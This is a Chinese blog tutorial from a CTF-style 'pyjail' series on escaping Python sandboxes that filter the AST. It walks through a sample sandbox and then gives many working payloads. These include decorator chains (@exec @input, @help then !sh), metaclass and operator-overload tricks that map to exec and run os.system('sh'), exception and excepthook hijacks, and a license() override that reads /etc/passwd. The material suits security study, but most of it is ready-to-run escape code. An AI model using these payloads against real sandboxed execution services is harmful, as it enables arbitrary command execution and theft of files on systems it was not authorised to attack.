> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [dummykitty.github.io](https://dummykitty.github.io/posts/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1/)

> 绕过 AST 沙箱 AST 沙箱会将用户的输入转化为操作码, 此时字符串层面的变换基本上没用了, 一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 ast.Import|ast.ImportFro......

绕过 AST 沙箱[](#绕过-ast-沙箱)
-----------------------

AST 沙箱会将用户的输入转化为操作码, 此时字符串层面的变换基本上没用了, 一般情况下考虑绕过 AST 黑名单. 例如下面的沙箱禁止了 ast.Import|ast.ImportFrom|ast.Call 这三类操作, 这样一来就无法导入模块和执行函数.

```
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)
```

下面的几种利用方式来源于 hacktricks

### without call[](#without-call)

如果基于 AST 的沙箱限制了执行函数, 那么就需要找到一种不需要执行函数的方式执行系统命令.

#### 装饰器[](#装饰器)

利用 payload 如下:

```
@exec
@input
class X:
    pass
```

当我们输入上述的代码后, Python 会打开输入, 此时我们再输入 payload 就可以成功执行命令.

```
>>> @exec
... @input
... class X:
...     pass
... 
<class '__main__.X'>__import__("os").system("ls")
```

由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.

其实这样的话, 构造其实可以有很多, 比如直接打开 help 函数.

```
@help
class X:
    pass
```

这样可以直接进入帮助文档:

```
Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)
```

再次输入 !sh 即可打开 /bin/sh

#### 函数覆盖[](#函数覆盖)

我们知道在 Python 中获取一个的属性例如 `obj[argument]` 实际上是调用的 `obj.__getitem__` 方法. 因此我们只需要覆盖其 `__getitem__` 方法, 即可在使用 `obj[argument]` 执行代码:

```
>>> class A:
...     __getitem__ = exec
... 
>>> A()['__import__("os").system("ls")']
```

但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 ast.Call. 如何在不执行构造函数的情况下获取类实例呢?

##### metaclass 利用[](#metaclass-利用)

Python 中提供了一种元类 (metaclass) 概念。元类是创建类的“类”。在 Python 中，类本身也是对象，元类就是创建这些类（即类的对象）的类。

元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。

下面是基于元类的 payload, 在不使用构造函数的情况下触发

```
class Metaclass(type):
    __getitem__ = exec 
    
class Sub(metaclass=Metaclass):
    pass

Sub['import os; os.system("sh")']
```

除了 `__getitem__` 之外其他方法的利用方式如下:

```
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```

示例:

```
class Metaclass(type):
    __sub__ = exec
    
class Sub(metaclass=Metaclass):
    pass

Sub-'import os; os.system("sh")'
```

##### exceptions 利用[](#exceptions-利用)

利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:

```
class RCE(Exception):
    def __init__(self):
        self += 'import os; os.system("sh")'
    __iadd__ = exec 
    
raise RCE
```

raise 会进入 RCE 的 `__init__`, 然后触发 `__iadd__` 也就是 exec.

当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发, 与是就有了如下的几种 payload.

```
class X:
    def __init__(self, a, b, c):
        self += "os.system('sh')"
    __iadd__ = exec
sys.excepthook = X
1/0
```

这个 payload 中直接将 sys.excepthook 进行覆盖, 任何异常产生时都会触发.

```
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```

这个 payload 将 `__import__` 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如 traceback 模块），导入时就会触发 `__import__`.

#### 通过 license 函数读取文件[](#通过-license-函数读取文件)

```
__builtins__.__dict__["license"]._Printer__filenames=["/etc/passwd"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```

上面的 payload 修改内建函数 license 的文件名列表为 /etc/passwd 当调用 `license()` 时会打印这个文件的内容.

```
>>> __builtins__.__dict__["license"]._Printer__filenames
['/usr/lib/python3.11/../LICENSE.txt', '/usr/lib/python3.11/../LICENSE', '/usr/lib/python3.11/LICENSE.txt', '/usr/lib/python3.11/LICENSE', './LICENSE.txt', './LICENSE']
```

payload 中将 help 类的 `__enter__` 方法覆盖为 `license` 方法, 而 with 语句在创建上下文时会调用 help 的`__enter__`, 从而执行 `license` 方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的. 例如:

```
class MyContext:
    pass
    
__builtins__.__dict__["license"]._Printer__filenames=["/etc/passwd"]
a = MyContext()
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```

参考资料[](#参考资料)
-------------

*   [Python 沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E8%BF%87%E6%BB%A4-globals)
*   [Python 沙箱逃逸的经验总结](https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E5%89%8D%E8%A8%80)
*   [Python 沙箱逃逸的通解探索之路](https://www.tr0y.wang/2022/09/28/common-exp-of-python-jail/)
*   [python 沙箱逃逸学习记录](https://xz.aliyun.com/t/12303#toc-11)
*   [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
*   [[PyJail] python 沙箱逃逸探究 · 上（HNCTF 题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
*   [[PyJail] python 沙箱逃逸探究 · 中（HNCTF 题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
*   [[PyJail] python 沙箱逃逸探究 · 下（HNCTF 题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
*   [audited2](https://ctftime.org/writeup/31883)
*   [【ctf】HNCTF Jail All In One](https://www.woodwhale.top/archives/hnctfj-ail-all-in-one)
*   [HAXLAB — Endgame Pwn](https://ctftime.org/writeup/28286)
*   [Python 沙箱逃逸的 n 种姿势](https://ctftime.org/writeup/28286)
*   [hxp2020-audited](https://pullp.github.io/writeup/2020/12/26/hxp2020-audited.html)